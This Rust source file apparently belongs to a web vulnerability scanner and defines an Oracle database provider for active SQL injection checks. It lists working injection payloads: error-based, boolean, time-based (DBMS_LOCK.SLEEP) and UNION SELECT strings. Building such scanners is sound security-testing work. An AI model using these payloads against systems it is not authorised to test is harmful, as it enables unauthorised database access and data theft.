use crate::scanner::rules::active::sqli::providers::DbProvider;

pub struct OracleProvider;

impl DbProvider for OracleProvider {
    fn name(&self) -> &'static str { "Oracle" }
    fn error_payloads(&self) -> Vec<&'static str> { vec!["'", "' OR 1=1--", "' FROM DUAL--"] }
    fn boolean_payloads(&self) -> Vec<(&'static str, &'static str)> { vec![("true", " AND 1=1"), ("false", " AND 1=2")] }
    fn time_payloads(&self) -> Vec<&'static str> { vec!["' OR DBMS_LOCK.SLEEP(5)--"] }
    fn union_payloads(&self) -> Vec<&'static str> { vec![" UNION SELECT NULL FROM DUAL", " UNION SELECT NULL,NULL FROM DUAL"] }
}
